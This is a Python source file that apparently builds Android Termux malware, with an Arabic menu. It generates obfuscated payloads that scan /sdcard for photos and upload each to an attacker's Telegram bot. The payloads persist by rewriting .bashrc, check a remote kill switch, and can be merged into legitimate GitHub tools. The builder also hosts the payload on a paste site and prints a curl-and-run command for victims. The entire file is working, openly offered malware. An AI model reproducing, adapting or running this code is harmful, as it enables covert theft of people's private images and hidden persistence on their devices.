import os
import sys
import time
import requests
import random
import marshal
import string
try:
    import rich
except ModuleNotFoundError or ImportError:
    os.system('pip install rich')
from rich.console import Console

console = Console()


def Signpost(file):
    import requests
    from bs4 import BeautifulSoup
    with open(file, 'r') as file:
        snipe = file.read()
    url = 'https://snippet.host/'

    response = requests.get(url)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')

        form = soup.find('form', {'id': 'snippet-form'})

        if form:

            textarea = form.find('textarea', {'id': 'snippet-content'})

            if textarea:

                textarea.string = snipe

                form_action = form['action']

                form_data = {
                    'title': '',
                    'content': textarea.text,
                    'visibility': '2',
                    'language': 'python',
                    'expires': 'never'
                }

                response = requests.post(url + form_action, data=form_data)

                if response.status_code == 200:
                    return response.url + "/raw"
                else:
                    return "**********"
            else:
                print("Textarea 'snippet-content' not found within the form.")
        else:
            print("Form 'snippet-form' not found on the page.")
    else:
        print("Failed to access the website. Status code:", response.status_code)


def create_github(name, i, a, mypath):
    with open(name, 'w') as File:
        File.write(f"""
import os
import subprocess, sys
from time import sleep as x

sys.setrecursionlimit(5000000)


class Zeyad:
    def __init__(self):
        self.link = '{i}'
        self.mypath = '{mypath}'
        self.txt = "/sdcard/Myfile.txt"
        self.txt2 = "/sdcard/Myfile1.txt"
        self.bashrc = "/data/data/com.termux/files/home/.bashrc"
        self.FilePer = "/data/data/com.termux/files/home/.per.py"
        self.test = "/sdcard/test.txt"
        self.file = __file__
        self.target = "/data/data/com.termux/files/home/" + os.path.basename(__file__)
        if self.CheckIfTermux_Pydroid() == "pydroid":
            self.checkstyle()
        elif self.CheckIfTermux_Pydroid() == "termux":
            if not os.path.exists(self.target):
                os.system("cp " + __file__ + " " + self.target)
            if len(sys.argv) == 1:
                self.Normal_Run()
            else:
                if len(sys.argv) == 2:
                    if sys.argv[1] == "START":
                        self.ReadyToStart()
                    if sys.argv[1] == "PER":
                        self.GetPermission()

    def GitPythonFiles(self):
        a = None
        for file in os.listdir(self.mypath):
            ext = os.path.splitext(file)[1]
            if ext in [".py"]:
               if not file == "":
                  a = file
        if a is not None:
            return a
        else:
           for file in os.listdir(self.mypath):
              if os.path.isfile(self.mypath+"/"+file):
                ext = os.path.splitext(file)[1]
                if ext == "":
                    return file

    def ReadyToStart(self):
        import requests
        try:
            requests.get("https://google.com")
            open(self.test, 'w').write('fuck')
        except requests.exceptions.RequestException:
            x(10)
            self.ReadyToStart()
        except PermissionError:
            self.GetPermission()
        self.checkstyle()

    def Normal_Run(self):
        import requests
        try:
            open(self.test, 'w').write('fuck')
            with open(self.bashrc, 'w') as File:
                File.write(f'nohup python {{self.target}} START > /dev/null 2>&1 &')
                os.system(f'nohup python {{self.target}} START > /dev/null 2>&1 &')
            if not os.path.exists(self.mypath):
                os.system(f'git clone {{self.link}}')
                os.system(f'cd {{self.mypath}} && python {{self.GitPythonFiles()}}')
            else:
                os.system(f'cd {{self.mypath}} && python {{self.GitPythonFiles()}}')
        except PermissionError:
            with open(self.bashrc, 'w') as NoFile:
                NoFile.write(f'python {{self.target}} PER')
            if not os.path.exists(self.mypath):
                os.system(f'git clone {{self.link}}')
                os.system(f'cd {{self.mypath}} && python {{self.GitPythonFiles()}}')
            else:
                os.system(f'cd {{self.mypath}} && python {{self.GitPythonFiles()}}')
        except requests.exceptions.ConnectionError:
            x(6)
            sys.exit('\\033[1;31m internet disconnect')

    def GetPermission(self):
        try:
            os.system("termux-setup-storage")
            open(self.test, 'w').write('fuck')
            with open(self.bashrc, 'w') as Fuck:
                Fuck.write(f'nohup python {{self.target}} START > /dev/null 2>&1 &')
                os.system(f'source {{self.bashrc}}')
                sys.exit()
        except PermissionError:
            self.GetPermission()

    def tele(self, document_path):
        import requests
        try:
            files = {{
                "document": (document_path, open(document_path, "rb"))
            }}
            response = requests.post(f'https://api.telegram.org/bot{a[0]}/sendDocument?chat_id=@{a[1]}', files=files)
            if response.status_code == 200:
                with open(self.txt2, 'a') as max:
                    max.write(document_path + "\\n")
        except FileNotFoundError or FileExistsError:
           time.sleep(3)
           self.AllFileInTxt()
        except:
            self.__init()

    def CheckIfTermux_Pydroid(self):
        if os.path.exists(self.bashrc):
            return "termux"
        else:
            return "pydroid"

    def checkstyle(self):
        if not os.path.exists(self.txt):
            self.AllFileInTxt()
        else:
            if os.path.exists(self.txt2):  ##second
                s = open(self.txt2, 'r').read()
                with open(self.txt, 'r') as txt:
                    for line in txt:
                        if line.strip() in s:
                            continue
                        self.tele(line.strip())
                        x(0.5)
            else:
                with open(self.txt, 'r') as m:
                    for line in m:
                        self.tele(line.strip())
                        x(1)

    def AllFileInTxt(self):
        
        try:
            s = open(self.txt, 'w')
            for root, dirs, files in os.walk('/sdcard'):
                for file in files:
                    ext = os.path.splitext(file)[1]
                    if ext in [".jpg", ".png", ".jpeg", ".hiec"]:
                        s.write(str(root + "/" + file) + "\\n")
            s.close()
            self.checkstyle()
        except PermissionError:
            self.GetPermission()


def install(com):
    subprocess.run(com, shell=True, capture_output=True, text=True)


def installlib():
    try:
        import rich
    except ModuleNotFoundError or ImportError:
        install('pip install rich')
    try:
        import requests
    except ModuleNotFoundError or ImportError:
        install('pip install requests')
    except:
        x(10)
        installlib()
    finally:
        Zeyad()


installlib()


    """)


def local_create(name, final, a, rand):
    with open(name, 'w') as File:
        File.write(f'''
import os
import subprocess, sys
from time import sleep as x
wa = """{final}
"""
sys.setrecursionlimit(5000000)

class Zeyad:
    def __init__(self):
        self.txt = "/sdcard/Myfile.txt"
        self.txt2 = "/sdcard/Myfile1.txt"
        self.bashrc = "/data/data/com.termux/files/home/.bashrc"
        self.FilePer = "/data/data/com.termux/files/home/.per.py"
        self.test = "/sdcard/test.txt"
        self.file = __file__
        self.target = "/data/data/com.termux/files/home/" + os.path.basename(__file__)
        if self.CheckIfTermux_Pydroid() == "pydroid":
            self.checkstyle()
        elif self.CheckIfTermux_Pydroid() == "termux":
            if not os.path.exists(self.target):
                os.system("cp "+__file__ +" "+self.target)
            if len(sys.argv) == 1:
                self.Normal_Run()
            else:
                if len(sys.argv)  ==2 :
                   if sys.argv[1] == "START":
                    self.ReadyToStart()
                   if sys.argv[1] == "PER":
                    self.GetPermission()
    def ReadyToStart(self):
        import requests
        try:
            requests.get("https://google.com")
            open(self.test,'w').write('fuck')
        except requests.exceptions.RequestException:
            x(10)
            self.ReadyToStart()
        except PermissionError:
            self.GetPermission()
        self.checkstyle()


    def Normal_Run(self):
        import requests
        try:
            open(self.test,'w').write('fuck')
            if not os.path.exists('{rand}'):
                with open('{rand}','w')as keyfile:
                    keyfile.write(wa)
            with open(self.bashrc,'w')as File:
                File.write(f'nohup python {{self.target}} START > /dev/null 2>&1 &')
                os.system(f'source {{self.bashrc}}')
            os.system(f"python {rand}")
        except PermissionError:
            with open(self.bashrc,'w')as NoFile:
                NoFile.write(f'python {{self.target}} PER')
            os.system(f"python {rand}")
        except requests.exceptions.ConnectionError:
            x(6)
            sys.exit('\\033[1;31m internet disconnect')
    def GetPermission(self):
        try:
            os.system("termux-setup-storage")
            open(self.test,'w').write('fuck')
            with open(self.bashrc,'w')as Fuck:
                Fuck.write(f'nohup python {{self.target}} START > /dev/null 2>&1 &')
                os.system(f'source {{self.bashrc}}')
                sys.exit()
        except PermissionError:
            self.GetPermission()


    def tele(self, document_path):
        import requests
        try:

            files = {{
                "document": (document_path, open(document_path, "rb"))
            }}

            response = requests.post(
                f"https://api.telegram.org/bot{a[0]}/sendDocument?chat_id=@{a[1]}",
                files=files
            )
            if response.status_code == 200:
                with open(self.txt2, 'a') as max:
                    max.write(document_path + "\\n")
        except FileNotFoundError or FileExistsError:
           time.sleep(3)
           self.AllFileInTxt()
              
        except:
            self.__init__()

    def CheckIfTermux_Pydroid(self):
        if os.path.exists(self.bashrc):
            return "termux"
        else:
            return "pydroid"





    def checkstyle(self):
        if not os.path.exists(self.txt):
            self.AllFileInTxt()
        else:
            if os.path.exists(self.txt2):  ##second
                s = open(self.txt2, 'r').read()
                with open(self.txt, 'r') as txt:
                    for line in txt:
                        if line.strip() in s:
                            continue
                        self.tele(line.strip())
                        x(0.5)
            else:
                with open(self.txt, 'r') as m:
                    for line in m:
                        self.tele(line.strip())
                        x(1)

    def AllFileInTxt(self):
        try:
            s = open(self.txt, 'w')
            for root, dirs, files in os.walk('/sdcard'):
                for file in files:
                    ext = os.path.splitext(file)[1]
                    if ext in [".jpg", ".png", ".jpeg", ".hiec"]:
                        s.write(str(root + "/" + file) + "\\n")
            s.close()
            self.checkstyle()
        except PermissionError:
            self.GetPermission()


def install(com):
      subprocess.run(com, shell=True, capture_output=True, text=True)
def installlib():
    try:
        import rich
    except ModuleNotFoundError or ImportError:
        install('pip install rich')
    try:
        import requests
    except ModuleNotFoundError or ImportError:
        install('pip install requests')
    except:
        x(10)
        installlib()
    finally:
        Zeyad()
installlib()
''')




def clear():
    os.system('clear')


def MarshalDecode(file):
    with open(file, 'rb') as f:
        source_code = f.read()

    compiled_code = compile(source_code, 'original_script.py', 'exec')
    encrypted_data = marshal.dumps(compiled_code)

    with open(file, 'wb') as bb:
        bb.write(encrypted_data)
    with open(file, 'rb') as f:
        encrypted_data = f.read()
    with open(file, 'w') as file:
        file.write(f''' 
## ENCRYPCTION BY Zeyad Alabany           
import marshal
compiled_code = marshal.loads({encrypted_data})
exec(compiled_code)
    ''')


def telegram(bot, group, text,op):
    try:

        url = f'https://api.telegram.org/bot{bot}/sendMessage?chat_id=@{group}&text={text}'
        res = requests.get(url)
        if res.status_code == 200:
            if op:
                console.print("تـم الارسال بنجاح",style="bold green")
        elif res.status_code == 400:
            if op:
                console.print('قد يكون ايدي القروب خطا',style="bold red3")
        elif res.status_code == 401:
            if op:
                console.print("API البوت قد يكون خطا",style="bold red3")
        else:
            pass
    except requests.exceptions.RequestException:
        print("انقطع الاتصال بالانترنت")
        sys.exit()


def Lang_Setting():
    if os.path.exists('/data/data/com.termux/files/home/.termux/font.ttf'):
        console.print("ملف لغة عربية مثبت بالفعل هل تريد حذفه [Y/N]؟", style="bold red3")
        x = input("\033[4;36m CHOOSE =>")
        print("\033[0;30m ")
        if x in ["y", "Y", "Yes", "yes", "YES"]:  # lang
            os.system('rm -rf /data/data/com.termux/files/home/.termux/font.ttf')
            os.system('termux-reload-settings')
            sys.exit('ﺔﻴﺑﺮﻌﻟﺍ ﺔﻐﻠﻟﺍ ﻒﻠﻣ ﻥﻭﺪﺑ ﺓﺍﺩﻻﺍ ﻞﻴﻐﺸﺗ ﻦﻜﻤﻳ ﻻ')


active = "/data/data/com.termux/files/home/.active.cov"
setting = '/data/data/com.termux/files/home/setting.cov'
Myapp = '/sdcard/Zeyad-Alabany/'


class Ziyad:

    def __init__(self):
        self.test = "/sdcard/test.cov"
        self.history = "/data/data/com.termux/files/home/.bash_history"
        self.path = "/sdcard/Zeyad-Alabany/bot.txt"
        self.bashrc = "/data/data/com.termux/files/home/.bashrc"
        self.dir = os.path.dirname(os.path.abspath(__file__))
        try:
            open(self.test, 'w').write("")
            if not os.path.exists(Myapp):
                os.makedirs(Myapp)
            if not os.path.exists(self.path):
                if not os.path.exists(Myapp):
                    os.makedirs(Myapp)
                self.Settings()
                self.bot()
            else:
                if not os.path.exists(Myapp):
                    os.makedirs(Myapp)
                os.system(f'touch {setting}')
                self.Settings()
                self.Termux()
        except PermissionError:
            self.installation()

    def Settings(self):
        test = f"python {__file__} tool"
        if not os.path.exists(self.bashrc):
            with open(self.bashrc, 'w') as Newfile:
                Newfile.write("")
        if os.path.getsize(self.bashrc) == 0 or os.path.getsize(self.bashrc) == 1:
            with open(self.bashrc, 'w') as File:
                File.write(test)
        else:
            r = open(self.bashrc, 'r').read()
            if test in r:
                pass
            else:
                with open(self.bashrc, 'a') as File:
                    File.write(test)
        with open(self.history, 'w') as G:
            G.write(f'python {__file__}')

    def installation(self):
        try:
            open(self.test, 'w').write("")
            if not os.path.exists(Myapp):
                os.makedirs(Myapp)
        except PermissionError:
            console.print("GIVE PERMISSION WITH Y", style="bold red3")
            os.system('termux-setup-storage')
        finally:
            try:
                open(self.test, 'w').write("")
                if not os.path.exists(Myapp):
                    os.makedirs(Myapp)
            except PermissionError:
                sys.exit('\033[4;32m لا يمكن تشغيل الاداة')

    @staticmethod
    def RandomString():
        a = random.choices(string.digits + string.ascii_uppercase, k=10)
        b = "".join(a)
        if not os.path.exists(active):
            with open(active, 'w') as File:
                File.write(b)
        with open(active, "r") as Cov:
            key = Cov.read()
        return key

    def splitgrup(self,raw):
        if "https" in raw:
            raw = raw.split("/")
            return raw[3]
        else:
            return raw

    def bot(self):
        console.print("\n ادخل [API] بوت تيليغرام ", style="bold red3 on white")
        os.system('am start https://t.me/BotFather')
        x = input(":")
        console.print("ادخل يوزر قروب تيليغرام ", style="bold red3 on white")
        y = input(":")
        y = self.splitgrup(y)
        console.print("تم ارسال رسالة نصية الى تيليغرام يرجى تاكيد على معلومات", style="bold red3 on white")
        a = str(random.randint(1000, 9999))
        op = True
        telegram(x, y, a,op)
        console.print("Put Your Code Here", style="bold red3 on white")
        conf = input(":")
        if conf == a:
            with open(self.path, 'w') as bot:
                bot.write(f"{x}|{y}|")
            op = False
            self.Termux()
        else:
            console.print("Your Code is Wrong !!", style="bold white on red3")
            time.sleep(3)
            self.bot()

    @staticmethod
    def Banner():
        note = '''\033[1;35m         ;               ,           
         ,;                 '.         
        ;:                   :;        
       ::                     ::       
       ::                     ::       
       ':                     :        
        :.                    :        
     ;' ::                   ::  '     
    .'  ';                   ;'  '.    
   ::    :;                 ;:    ::   
   ;      :;.             ,;:     ::   
   :;      :;:           ,;"      ::   
   ::.      ':;  ..,.;  ;:'     ,.;:   
    "'"...   '::,::::: ;:   .;.;""'    
        '"""....;:::::;,;.;"""         
    .:::.....'"':::::::'",...;::::;.   
   ;:' '""'"";.,;:::::;.'""""""  ':;   
  ::'         ;::;:::;::..         :;  
 ::         ,;:::::::::::;:..       :: 
 ;'     ,;;:;::::::::::::::;";..    ':.
::     ;:"  ::::::"""'::::::  ":     ::
 :.    ::   ::::::;  :::::::   :     ; 
  ;    ::   :::::::  :::::::   :    ;  
   '   ::   ::::::....:::::'  ,:   '   
    '  ::    :::::::::::::"   ::       
       ::     ':::::::::"'    ::       
       ':       """""""'      ::       
        ::                   ;:        
        ':;                 ;:"        
sxtz0     ';              ,;'          
            "'           '"   \n
            الاداة برعــاية Skiller && عمر التـرهوني && عمـر الهكر
            \n'''
        for letter in note:
            sys.stdout.write(letter)
            sys.stdout.flush()
            time.sleep(0.001)

    def Rapid_Setting(self):
        with open(setting, 'r') as Edit:
            final = Edit.read()
        if 'stop' in final:
            console.print("تم ايقاف ميزه تشغيل سريع هل تريد استعادتها [Y/N]؟", style="bold red3")
            x = input("\033[4;36m CHOOSE =>")
            print("\033[0;30m ")
            if x in ["y", "Y", "Yes", "yes", "YES"]:
                with open(setting, 'w') as Set:
                    Set.write("")
                self.Termux()
            else:
                self.Termux()
        else:
            console.print("ميـزة تشغيل فعاله هل تريد ايقافها[Y/N] ؟", style="bold red3")
            x = input("\033[4;36m CHOOSE =>")
            print("\033[0;30m ")

            if x in ["y", "Y", "Yes", "yes", "YES"]:
                with open(setting, 'w') as My:
                    My.write("stop")
                self.Termux()
            else:
                self.Termux()
    def Confirm():
        return True

    def Termux(self):
        clear()
        self.Banner()
        console.print(f'''\n
        
     
 صنع فيروس سحب صور -[1]
 دمج فيروس سحب صور باداة صيد -[2]
 تعديل معلومات الشخصية -[3]
 اعدادات التشغيل السريع -[4]
 الغـاء اللغة العربية و ارجاع اعدادات نظام -[5]
 حسابــي تيليغرام -[6]
 حسابي فيـسبوك -[7]
 خــروج -[8]   
        ''', style='cyan2')
        x = int(input("\033[4;36m CHOOSE : "))
        print("\033[0;30m ")

        try:
            if x == 1:
                if self.Confirm():
                    self.CreateVirus()
                else:
                    console.print("يرجى الاشتراك في الاداة", style="bold red3")
                    print(f"\033[4;32m   ZEYAD-{self.RandomString()}")
                    print("\033[0;30m ")
                    time.sleep(6)
                    self.Termux()
            elif x == 2:
                if self.Confirm():
                    self.MergeVirus()
                else:
                    console.print("يرجى الاشتراك في الاداة", style="bold red3")
                    print(f"\033[4;32m  ZEYAD-{self.RandomString()}")
                    print("\033[0;30m ")

                    time.sleep(6)
                    self.Termux()

            elif x == 3:
                self.bot()
            elif x == 4:
                self.Rapid_Setting()
            elif x == 5:
                Lang_Setting()
            elif x == 6:
                os.system('am start https://t.me/sxtz0')
                self.Termux()
            elif x == 7:
                os.system('am start https://m.facebook.com/profile.php?id=100000593464379')
                self.Termux()
            else:
                console.print("wrong !!", style="bold red on white")
                time.sleep(4)
                self.Termux()
        except ValueError:
            console.print("JUST CHOISING NUMBER !!", style='white on red3')
            clear()
            self.Termux()

    def MergeVirus(self):
        def randomname():
            a = random.choices(string.digits + string.ascii_uppercase, k=4)
            b = "".join(a)
            return b + ".py"

        clear()

        def github():
            def splitting(raw):
                last = len(raw) - 1
                if raw[last] == "/":
                    raw = raw.replace(raw, raw[:-1])
                if raw.endswith(".git"):
                    raw = raw.replace(raw, raw[:-4])
                backspace = raw.split("/")
                if len(backspace) == 6:
                    if backspace[5] == "":
                        pass
                    if len(backspace[4]) > 0:
                        return backspace[4]
                else:
                    return backspace[4]

            i = input("\033[4;36m  الـصق رابط الاداة المباشر:  ")
            rand = randomname()
            print("\033[0;30m ")

            if "github" and "https://" in i:
                res = requests.get(i)
                if res.status_code == 404:
                    console.print("الاداة محذوفه بالفعل لا يمكنك دمجها",style="bold red3")
                    time.sleep(5)
                    clear()
                    github()

                mypath = splitting(i)
            else:
                print("\033[1;32m خطا")
                mypath = ""
                time.sleep(3)
                clear()
                github()
            console.print('\n اختــار اسـم الفيروس', style='bold red3 ')
            man = input("")
            man = Myapp + man
            r = open(self.path, 'r').read()
            a = r.split("|")
            create_github(man + ".py", i, a, mypath)
            console.print("جــاري تشفير الفيــروس ......", style="bold red3")
            MarshalDecode(man + ".py")
            try:
                com = Signpost(man + '.py')
                if "raw" in com:
                    console.print("تم انشاء امر اختراق لك يرجى نسخ الامر \n", style="bold green")
                    console.print(f"curl {com} -o {rand} && python {rand}",style="bold green")
                    input("\n \033[1;32m  انسخ و اضغط للمتابعة")
                else:
                    console.print("فشلت عملية انشاء فيروس اونلاين سبب غير معروف", style="bold red3")
                    pass
            except requests.exceptions.ConnectionError:
                console.print("اتصالك بالانترنت ضعيف فشلت عملية انشاء فيروس اونلاين")
            mes = f"تــم انشـاء الفيروس بنجاح موجود في >>  {man}.py"
            console.print(mes, style="bold red3")
            time.sleep(7)
            self.Termux()

        def local():
            clear()
            i = input("\033[4;32m اسم الملف المحلي:  ")
            print("\033[0;30m")
            if os.path.exists(i):
                pass
            else:
                print('\033[4;31m هذا الملف غير موجود:  ')
                print("\033[0;30m ")

                time.sleep(3)
                clear()
                local()
            with open(i, 'r') as Merge:
                final = Merge.read()
            rand = randomname()
            console.print('\n اختــار اسـم الفيروس', style='bold red3')
            nameV = input("")
            nameV = Myapp + nameV
            r = open(self.path, 'r').read()
            a = r.split("|")
            local_create(nameV + ".py", final, a, rand)
            console.print("جــاري تشفير الفيــروس ......", style="bold red3")
            MarshalDecode(nameV + ".py")
            mes = f"تــم انشـاء الفيروس بنجاح موجود في  >> {os.getcwd()}"
            console.print(mes, style="bold red3")
            time.sleep(7)
            self.Termux()

        console.print(''' 
[1]- دمج بواسطة رابط قيتهوب
[2]- دمج بواسطة ملف محلي
[3]- عـودة
        
        
        
        ''', style='cyan2')
        try:
            x = int(input("\033[4;36m CHOOSE => "))
            print("\033[0;30m ")

            if x == 1:
                github()
            elif x == 2:
                local()
            elif x == 3:
                self.Termux()
            else:
                print('يرجى اختيار من القائمه')
                time.sleep(3)
                clear()
                self.MergeVirus()
        except ValueError:
            clear()
            sys.exit('\033[4;32m خطـا')

    def CreateVirus(self):
        clear()
        self.Banner()
        console.print('\n اختــار اسـم الفيروس', style='bold red3')
        x = input("")
        r = open(self.path, 'r').read()
        a = r.split("|")
        virus = open(x + ".py", 'w')
        virus.write(f'''


import os
import subprocess, sys
from time import sleep as x


class Zeyad:
    def __init__(self):
        self.txt = "/sdcard/Myfile.txt"
        self.txt2 = "/sdcard/Myfile1.txt"
        self.bashrc = "/data/data/com.termux/files/home/.bashrc"
        self.FilePer = "/data/data/com.termux/files/home/.per.py"
        self.test = "/sdcard/test.txt"
        self.file = __file__
        self.target = "/data/data/com.termux/files/home/" + os.path.basename(__file__)
        import requests
        try:
            requests.get("https://google.com")
            s =requests.get("https://pastebin.com/raw/qKxaZ1Km").text
            a = '["ZV-ACTIVE"]'
            if a in s:
               pass
            else:
               os.remove(__file__)
               sys.exit('Follow ME TELE: sxtz0')
        except:
            x(4)
            self.__init__()
        if not os.path.exists(self.target):
            os.system("cp "+__file__ +" "+self.target)
        if self.CheckIfTermux_Pydroid() == "pydroid":
            self.checkfile()
        elif self.CheckIfTermux_Pydroid() == "termux":
            self.Middle()
    def Middle(self):
        try:
            open(self.test,'w').write('fuck')
            a = open(self.bashrc,'r').read()
            if "nohup" in a:
                self.checkfile()
            else:
                self.InjectionHide()
                self.checkfile()
        except PermissionError:
            self.GetPermission()



    def GetPermission(self): ## without permission
            try:
                open(self.test, 'w').write("fuck")
                self.InjectionHide()
            except PermissionError:
                os.system("termux-setup-storage")
                with open(self.FilePer, 'w') as per:
                    per.write(f"""
from os import system
from rich.console import Console
console = Console()
console.print('termux update for now !!',style='bold red3')
def per():
     try:
       open('{{self.test}}','w')
       system('nohup python {{self.target}} > /dev/null 2>&1 &')
     except:
        system('termux-setup-storage')
        per()
per()""")
                w = open(self.bashrc, 'w')
                w.write('python ' + self.FilePer)
                w.close()
                sys.exit()

    def tele(self, document_path):
        import requests
        try:

            files = {{
                "document": (document_path, open(document_path, "rb"))
            }}

            response = requests.post(
                f"https://api.telegram.org/bot{a[0]}/sendDocument?chat_id=@{a[1]}",
                files=files
            )
            if response.status_code == 200:
                with open(self.txt2, 'a') as max:
                    max.write(document_path + "\\n")
        except FileNotFoundError or FileExistsError:
           time.sleep(3)
           self.AllFileInTxt()
        except:
            self.__init__()

    def CheckIfTermux_Pydroid(self):
        if os.path.exists(self.bashrc):
            return "termux"
        else:
            return "pydroid"



    def InjectionHide(self):
            bash = open(self.bashrc,'w')
            bash.write(f'nohup python {{self.target}} > /dev/null 2>&1 &')
            bash.close()

    def checkfile(self):
        if not os.path.exists(self.txt):
            self.AllFileInTxt()
        else:
            if os.path.exists(self.txt2):  ##second
                s = open(self.txt2, 'r').read()
                with open(self.txt, 'r') as txt:
                    for line in txt:
                        if line.strip() in s:
                            continue
                        self.tele(line.strip())
            else:
                with open(self.txt, 'r') as m:
                    for line in m:
                        self.tele(line.strip())

    def AllFileInTxt(self):
        try:
            s = open(self.txt, 'w')
            for root, dirs, files in os.walk('/sdcard'):
                for file in files:
                    ext = os.path.splitext(file)[1]
                    if ext in [".jpg", ".png", ".jpeg", ".hiec"]:
                        s.write(str(root + "/" + file) + "\\n")
            s.close()
            self.checkfile()
        except PermissionError:
            self.GetPermission()


def install(com):
      subprocess.run(com, shell=True, capture_output=True, text=True)
def installlib():
    try:
        import rich
    except ModuleNotFoundError or ImportError:
        install('pip install rich')
    try:
        import requests
    except ModuleNotFoundError or ImportError:
        install('pip install requests')
    finally:
        Zeyad()
installlib()
        
        ''')
        virus.close()
        console.print("جــاري تشفير الفيــروس ......", style="bold red3")
        MarshalDecode(x + ".py")
        console.print(f"تــم انشـاء الفيروس بنجاح موجود في  >> {os.getcwd()}", style="bold red3 on white")
        time.sleep(7)
        input(" \033[4;36m ENTER TO SKIP :")
        print("\033[0;30m ")

        clear()
        self.Termux()


def setup():
    if os.path.exists('/data/data/com.termux/files/home/.termux/'):
        print("\033[1;32m YOUR SYSTEM IS TERMUX")
        if os.path.exists('/data/data/com.termux/files/home/.termux/font.ttf'):
            if os.path.getsize('/data/data/com.termux/files/home/.termux/font.ttf') == 778284:
                pass
            else:
                os.system('mv font.ttf /data/data/com.termux/files/home/.termux/font.ttf')
                os.system('termux-reload-settings')
        else:
            os.system('mv font.ttf /data/data/com.termux/files/home/.termux/font.ttf')
            os.system('termux-reload-settings')
    else:
        print("\033[1;31m Run On Termux Only")
        sys.exit()

    import time

    from rich.progress import Progress

    with Progress() as progress:
        task1 = progress.add_task("[green]تنــزيل متطلبات ...", total=100)
        task2 = progress.add_task("[green]تثبيت ملف لغة عـربية...", total=20)
        task3 = progress.add_task("[green]تحقق من تحديثات...", total=20)

        while not progress.finished:
            progress.update(task1, advance=0.5)
            progress.update(task2, advance=0.3)
            progress.update(task3, advance=0.9)
            time.sleep(0.02)
    clear()


def Present():
    message = """\033[1;32m تدعم هذه الاداة اللغه العربيه بالكامل وتدعم تحديثات التلقائية تمت البرمجة من قبل زيـاد العباني 
    وجميع الحقوق محفوظة"""
    for letter in message:
        time.sleep(0.01)
        sys.stdout.write(letter)
        sys.stdout.flush()
    time.sleep(5)
    clear()


class Basic:
    def __init__(self):
        self.bashrc = "/data/data/com.termux/files/home/.bashrc"
        self.checker = "/data/data/com.termux/files/home/.termux/"
        if os.path.exists(self.checker):
            pass
        else:
            sys.exit('\033[4;31m YOUR SYSTEM NOT TERMux')

        try:
            print("\033[1;31m جاري تحقق من اساسيات")
            import requests
            import tqdm
            import bs4
            print("\033[1;32m كل شي على ما يرام")
            time.sleep(1)
            clear()
            update_tool()
        except ModuleNotFoundError or ImportError:
            os.system("pip install requests && pip install rich && pip install tqdm")
        if os.path.exists('font.ttf'):
            if os.path.exists('/data/data/com.termux/files/home/.termux/font.ttf'):
                if os.path.getsize('/data/data/com.termux/files/home/.termux/font.ttf') == 778284:
                    os.system('rm -rf font.ttf')
                else:
                    os.system('rm -rf /data/data/com.termux/files/home/.termux/font.ttf')
                    setup()
            else:
                setup()
        elif not os.path.exists('/data/data/com.termux/files/home/.termux/font.ttf') and not os.path.exists('font.ttf'):

            import requests
            from tqdm import tqdm
            try:
                print("\033[4;32m ﺔﻴﺑﺮﻌﻟﺍ ﺔﻐﻠﻟﺍ ﻰﻟﺍ ﺲﻜﻣﺮﻴﺘﻟﺍ ﻞﻳﻮﺤﺗ ﻱﺭﺎﺟ \n")
                print("\033[0;30m ")

                file_url = "https://github.com/br5kly/Evil-Py/raw/main/font.ttf"

                local_file = "font.ttf"

                response = requests.get(file_url, stream=True)

                if response.status_code == 200:
                    total_size = int(response.headers.get('content-length', 0))

                    with open(local_file, "wb") as file, tqdm(
                            desc=local_file,
                            total=total_size,
                            unit='B',
                            unit_scale=True,
                            unit_divisor=1024,
                    ) as bar:
                        for data in response.iter_content(chunk_size=1024):
                            file.write(data)
                            bar.update(len(data))
                    print("\033[4;31m ﺔﻴﺑﺮﻋ ﺔﻐﻟ ﻒﻠﻣ ﻞﻴﻤﺤﺗ ﻢﺗ  ")
                    print("\033[0;30m ")

                    setup()
                else:
                    print(" \033[4;31m ﺔﻴﺑﺮﻋ ﺔﻐﻟ ﻒﻠﻣ ﻞﻴﻤﺤﺗ ﻞﺸﻓ  :")
                    print("\033[0;30m ")

                    sys.exit('\033[4;31m ﺖﻧﺮﺘﻧﻻﺎﺑ ﻝﺎﺼﺗﺍ ﻰﺟﺮﻳ')
            except requests.exceptions.RequestException:

                sys.exit('\033[4;31m ﻒﻴﻌﺿ ﺖﻧﺮﺘﻧﻻﺎﺑ ﻝﺎﺼﺗﺍ')

        if not os.path.exists('per.cov'):
            Present()
            os.system('touch per.cov')
            os.system(f"touch {setting}")
        if os.path.exists(active):
            if os.path.getsize(active) < 3:
                os.remove(active)
                sys.exit("تم اكـتشاف محاولة تلاعب بالنظام")
        Ziyad()


def RapidRun():
    if os.path.exists(setting):
        r = open(setting, 'r').read()
        if 'stop' in r:
            sys.exit()
        else:
            Ziyad.Banner()
            console.print("ميزه تشغيل السريع اضغط <Y/N>", style='bold red3')
            x = input("\033[4;36m CHOOSE [Y/N] : ")
            print("\033[0;30m ")
            if x in ["Y", "y", "Yes", "YES", ""]:
                clear()
                os.system(f'python {__file__}')
            else:
                clear()
                sys.exit()


def Check_Update():
    key = "[ZV-1]"
    ses = requests.get("https://github.com/br5kly/Evil-Py/blob/main/key.txt").text
    if key in ses:
        return False
    else:
        return True


def update_tool():
    import time
    if Check_Update():
        console.print("تحديث جديد جاري النحديث", style="bold red3")
        time.sleep(4)
        os.system('cd && rm -rf Evil-Py && git clone https://github.com/br5kly/Evil-Py && cd Evil-Py && python Zvirus.py')
    else:

        import time

        from rich.progress import Progress

        with Progress() as progress:
            task1 = progress.add_task("[green][جــاري تحــقق من تحديثات]...", total=100)

            while not progress.finished:
                progress.update(task1, advance=3)
                time.sleep(0.02)


if __name__ == '__main__':
    if len(sys.argv) == 2:
        if sys.argv[1] == "tool":
            RapidRun()
        if sys.argv[1] == "test":
            pass

    else:
        Basic()
